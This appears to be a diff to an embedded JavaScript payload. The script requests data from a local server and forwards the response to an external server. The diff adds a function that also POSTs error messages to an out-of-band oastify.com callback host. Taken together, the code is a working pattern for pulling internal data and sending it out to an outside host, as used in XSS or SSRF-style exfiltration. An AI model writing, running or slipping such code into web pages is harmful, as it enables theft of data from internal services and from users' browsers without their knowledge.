@@ -22,12 +22,14 @@ function sendRequest() {
             sendToExternalServer(xhr.responseText);
         } else {
             console.error('Error: Failed to retrieve data from the local server');
+            sendPingWithError(`Failed to retrieve data from local server with status: ${xhr.status}`);
         }
     };
 
     // Define what happens in case of error
     xhr.onerror = function () {
         console.error('Request failed');
+        sendPingWithError('Request to local server failed');
     };
 
     // Send the request to the local server
@@ -48,6 +50,34 @@ function sendToExternalServer(data) {
             console.log('Success: Data sent to the external server');
         } else {
             console.error('Error: Failed to send data to the external server');
+            sendPingWithError(`Failed to send data to external server with status: ${xhr.status}`);
+        }
+    };
+
+    // Define what happens in case of error
+    xhr.onerror = function () {
+        console.error('Request failed');
+        sendPingWithError('Request to external server failed');
+    };
+
+    // Send the request with the data
+    xhr.send(JSON.stringify({ content: data }));
+}
+
+// Function to send a ping with an error message
+function sendPingWithError(errorMessage) {
+    var xhr = new XMLHttpRequest();
+
+    // Configure it: POST-request for the URL
+    xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+
+    // Define what happens on successful data submission
+    xhr.onload = function () {
+        if (xhr.status >= 200 && xhr.status < 400) {
+            console.log('Success: Error message sent to the external server');
+        } else {
+            console.error('Error: Failed to send error message to the external server');
         }
     };
 
@@ -56,11 +86,11 @@ function sendToExternalServer(data) {
         console.error('Request failed');
     };
 
-    // Send the request with the data
-    xhr.send(JSON.stringify({ content: data }));
+    // Send the request with the error message
+    xhr.send(JSON.stringify({ error: errorMessage }));
 }
 
 // Call the function to initiate the requests
 sendRequest();
-    
+
 </script>
